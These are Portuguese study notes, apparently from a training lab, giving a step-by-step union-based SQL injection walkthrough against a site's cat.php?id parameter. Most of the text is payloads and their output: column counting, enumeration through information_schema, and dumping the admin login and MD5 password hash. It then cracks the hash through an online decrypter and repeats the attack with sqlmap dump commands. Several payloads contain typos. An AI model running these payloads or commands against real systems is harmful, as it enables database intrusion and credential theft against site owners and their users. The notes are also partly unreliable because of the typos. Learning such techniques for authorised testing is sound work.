SQL Injection na Pratica

procure buscas de BD como cat.php?...


Processos:
	Usar concatenação de Querys

	decobrir o numero de colunas
	www.bancocn.com/cat.php?id=1 <order by 1-- >
		order by 1 = pode ser usado para descobrir o numero de colunas ( 1, 2, 3 ...)
			     onde ao exceder o valor maximo retorna um erro 
		-- = Comentario

	www.bancocn.com/cat.php?id= < -1 union select 1, 2, 3 >
		-1 = indica para ignorar o retorno do 1º select
		union select = Pode concatenar varios selects
		Também pode ser usado para descobrir numero de colunas

	Descobrir Nome do Banco
	 www.bancocn.com/cat.php?id= < -1 union select 1, 2, "database()">
	 www.bancocn.com/cat.php?id= < -1 union select 1, 2, "group_concat(schema_name) from inromation_schema schemata" >
		Pode ser usado para descobrir nome de um banco ou Todos os Bancos
	* No caso o numero de informação passada em union select (1, 2...) tem de ser igual o numero de colunas da tabela
	RESULTADO{
		bancocn, information_schema
	}




	Descobir nome de tabelas
	www.bancocn.com/cat.php?id= < -1 union select 1, 2, "group_concat(table_name) from infomation_schema.tables WHERE table_schema="bancocn">
	RESULTADO{
		categories, pictures, stats, users
	}

	Descobir nome de colunas
	www.bancocn.com/cat.php?id= < -1 union select 1, 2, "group_concat(column_name) from infomation_schema.columns WHERE table_schema="bancocn">
	RESULTADO{
		(id,title,txt),(id,title,img,cat),(ip,count),(id,login,password)
	}

	Buscar de fato informações
	www.bancocn.com/cat.php?id= < -1 union select 1, 2, groupconcar(id, ":", login, ":", password) from bancocn.users
	RESULTADO{
		ID: 1, 
		USER: admin, 
		PASS: 7b71be0e85318117d2e514ce2a2e222c
	}

DESCRIPTOGRAFAR MD5
md5 killer
hashkiller.co.uk/md5-decrypter.aspx
	RESULTADO{
		7b71be0e85318117d2e514ce2a2e222c:senhafoda
	}


SQL MAP

<> sqlmap -u alvo --dbs --dbms=mysql
	--dbs = banco de dados
	--dbs = tipo de banco (opcional mas acelera o processo)
	RESPOSTA{
		available databases [2]:                                              
		[*] bancocn
		[*] information_schema
	}


<> sqlmap -r header.txt --dbs --dbms=mysql
	-r = PAssa o header caso necessario

<> sqlmao -r header.txt --dbms=mysql -D bancocn --tables
	-D = Indica o banco a ser usado
	--tables = Retorna todas as tabelas daquele banco

<> sqlmap -r header.txt -dbms=mysql -D bancocn -T users --columns
	-T = seleciona uma tabela
	-- columns = lista todas as colunas

<> sqlmap -r header.txt -dbms=mysql -D bancocn -T users  -C login,password --dump
	-C = seleciona uma coluna ou mais
	--dump = Exibe as informações
	RESULTADO{
				[1 entry]
		+-------+----------------------------------+
		| login | password                         |
		+-------+----------------------------------+
		| admin | 7b71be0e85318117d2e514ce2a2e222c |
		+-------+----------------------------------+
	}


SUCESSO





